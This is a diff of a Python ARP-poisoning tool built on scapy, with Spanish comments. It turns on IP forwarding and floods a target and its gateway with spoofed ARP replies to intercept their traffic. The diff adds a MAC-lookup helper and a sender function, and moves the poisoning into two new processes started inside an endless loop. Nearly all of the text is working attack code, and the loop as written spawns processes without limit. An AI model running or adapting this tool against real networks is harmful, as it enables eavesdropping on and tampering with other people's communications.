@@ -1,6 +1,6 @@
 import os
 from scapy.all import * 
-
+from multiprocessing import Process
 
 def cambiar_fw(valor):
 	f=open("/proc/sys/net/ipv4/ip_forward","w")
@@ -25,6 +25,19 @@ def getMACfromIP(ip):
 	print(mac)
 	return mac
 
+def getmac(interface):
+
+  try:
+    mac = open('/sys/class/net/'+interface+'/address').readline()
+  except:
+    mac = "00:00:00:00:00:00"
+
+  return mac[0:17]
+
+def enviarPaquete(paqueteARP):
+	print("Enviando paquetes ARP a " + paqueteARP[ARP].pdst + " con MAC " + paqueteARP[Ether].dst)
+	sendp(paqueteARP*2000,inter=1)
+
 
 def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
 	#Obtenemos las direcciones MAC necesarias
@@ -39,11 +52,15 @@ def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
 	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)
 
 	#Enviamos los paquetes para envenenar las tablas
+	#Creamos 2 procesos para enviar paquetes en paralelo
+
 	enviar=True
 	while enviar:
-		sendp(p1*2000,inter=1)
-		sendp(p2*2000,inter=1)
-
+		proceso=Process(target=enviarPaquete, args=(p1,))
+		proceso.start()
+		proceso2=Process(target=enviarPaquete, args=(p2,))
+		proceso2.start()
+	
 
 def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
 	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
@@ -107,3 +124,5 @@ def menuCapa():
 
 menuForwarding()
 menu()
+
+
